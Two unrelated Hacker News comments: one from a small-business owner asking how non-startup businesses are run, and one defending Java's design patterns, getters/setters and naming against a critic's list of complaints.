As someone who runs a small business which, for not-immediately-relevant reasons isn't in a position to try for startup-style explosive growth, I'd be really interested in hearing about how people in similar situations run their business. Regarding your examples of plumbers, barbers and cafes, we all think we know exactly how to run these, and in our heads probably think it's a pretty simple thing. What if we're wrong and there's something to learn?<p>I believe that businesses in this space are run with old-fashioned tools (management methods, process optimisation techniques, technology) for reasons of tradition and lack of information sharing rather than anything inherent to the businesses themselves. My experiences with business growth accelerators leads me to believe we as a community re-invent the wheel an enormous amount, and anything that helps me reduce that is of interest.<p>Sure, we have a different metric for success, but that doesn't mean there aren't unusually successful small businesses (that will remain comparatively small) that might have something interesting to say.",1346326762

Java has it's share of problems, and it's definitely not as modern (regarding language features) as some of the other languages today (although that seems to be changing too), but if you're going to attack it, then at least do it for it's bad characteristics, not because you personally dislike/don't understand certain features, or principles of OO development.<p><i>Design patterns- The art of bloating already heavily bloated code.</i><p>Design patterns are to OO code what salt is to food. Put just the right amount, and you get a tasty meal. Put too much, and you get an inedible pile of crap. Design patterns are not the problem, they are a solution. Bad developers who don't understand when and how to use them are the problem.<p><i>Love towards getters/settters and absolutely anything that lends to code bureaucracy.</i><p>It's true that Java is more bureaucratic than most languages, but there is a reason why getters and setters are the standard. And the reason is encapsulation. I can expand on this further if you want me to. For what it's worth, I think that this is one of the things that Scala got right [1].<p><i>Lengthen anything and everything as much as you can. thisIncludesTheVariableNames, Class names, methods names, package hierarchies, class inheritance. You name it they can pointlessly lengthen it.</i><p>CnfNfEx. ConfigurationFileNotFoundException.Which one of these two names do you think describes what the class does better?<p><i>If you write code in file at least 40% of the lines MUST be try/catch statements. If you can't be satisfied with that write your won exception classes and invoke point 5.</i><p>I don't know which APIs you worked with, but those that I use don't force me to put 40% of my code into try-catch statements.<p><i>Always write code which can't be read or figured out unless you have auto complete, intellisense and other IDE goodies.</i><p>I can see how autocomplete would make it easier to <i>write</i> code, but to read it? Nope, Java code is perfectly readable in a plain old editor, actually. But it's definitely not as easy to write using a plain old editor, to be perfectly honest.<p><i>Use XML as much as you can so that you can dogfood your insanity even more.</i><p>I agree with this one. XML madness needs to stop. Fortunately, it seems to be stopping already. For example, most modern DI frameworks don't require you to write your configuration in an XML file.<p><i>Make the code so verbose that even simple programs sound like very complicated ones that can be written only by you.</i><p>Verbosity is an unfortunate trait of Java. But nobody writes code so that it would seem that only they can write it. If they do, that's called over-engineering and is, believe it or not, considered to be a bad practice.<p>[1] <a href=""http://www.dustinmartin.net/2009/10/getters-and-setters-in-scala/"" rel=""nofollow"">http://www.dustinmartin.net/2009/10/getters-and-setters-in-s...</a>",1346326369
